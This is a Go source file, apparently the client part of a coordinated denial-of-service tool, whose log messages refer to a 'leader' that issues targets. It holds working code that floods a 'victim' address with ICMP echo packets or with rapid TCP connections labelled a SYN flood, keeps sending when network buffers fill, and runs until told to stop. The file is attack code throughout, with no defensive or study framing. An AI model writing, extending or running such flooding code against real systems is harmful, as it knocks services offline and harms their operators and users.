package client

import (
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"net"
	"os"
	"strings"
	"time"
)

func StartAttack(victim string, ddosType string, stopchan chan bool, logChan chan string) {
	if ddosType == "ICMP" {
		//ip without port
		ip := strings.Split(victim, ":")[0]
		go ICMPFlood(ip, stopchan, logChan)
	} else if ddosType == "SYN" {
		go SYNFlood(victim, stopchan, logChan)
	}
}
func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
	var maxChannelsNb = 20
	var channels = make(chan struct{}, maxChannelsNb)

	var blocked = false
	ipAddr, err := net.ResolveIPAddr("ip4", victim)
	// open a connection to the server
	conn, err := net.DialIP("ip4:icmp", nil, ipAddr)
	if err != nil {
		if strings.Contains(err.Error(), "permitted") {
			logChan <- "You don't have permission\n to send ICMP packets"
			return
		}
	}
	defer conn.Close()

	for {
		channels <- struct{}{}
		select {
		case isStop := <-stopChan:
			if isStop {
				logChan <- "Stopping the attack"
				stopChan <- false
				return
			}
			//continue to default

		default:
			if !blocked {
				go func() {
					err := SendICMP(CreateICMPMessage(), conn)
					if err != nil {
						if strings.Contains(err.Error(), "no buffer space") {
							//block sending
							blocked = true
							//wait for 1 second
							time.Sleep(1 * time.Second)
							logChan <- "freezing, your network\n buffer is full"
							blocked = false
						}
					}
					<-channels
				}()
			}
		}
	}
}
func CreateICMPMessage() *icmp.Message {
	return &icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   os.Getpid() & 0xffff,
			Seq:  1,
			Data: []byte("hello"),
		},
	}
}

func SendICMP(message *icmp.Message, conn *net.IPConn) error {
	// Resolve the IP address of the target host

	messageBytes, err := message.Marshal(nil)
	if err != nil {
		return err
	}

	_, err = conn.Write(messageBytes)
	//check if error message is : no buffer space available

	if err != nil {
		return err
	}

	return nil
}

func SYNFlood(victim string, stopChan chan bool, logChan chan string) {
	var maxChannelsNb = 20
	var channels = make(chan struct{}, maxChannelsNb)
	//check if port is specified
	if !strings.Contains(victim, ":") {
		victim = victim + ":80"
		logChan <- "leader does not specify port\n using port 80"
	}

	for {
		channels <- struct{}{}
		select {
		case isStop := <-stopChan:
			if isStop {
				logChan <- "Stopping attack"
				stopChan <- false
				return
			}
		default:
			go func() {
				conn, err := net.Dial("tcp", victim)

				if err == nil {
					err := conn.Close()
					if err != nil {
						return
					}
				}
				if err != nil {
					logChan <- "error sending SYN flood request"
				}
				<-channels
			}()
		}
	}
}
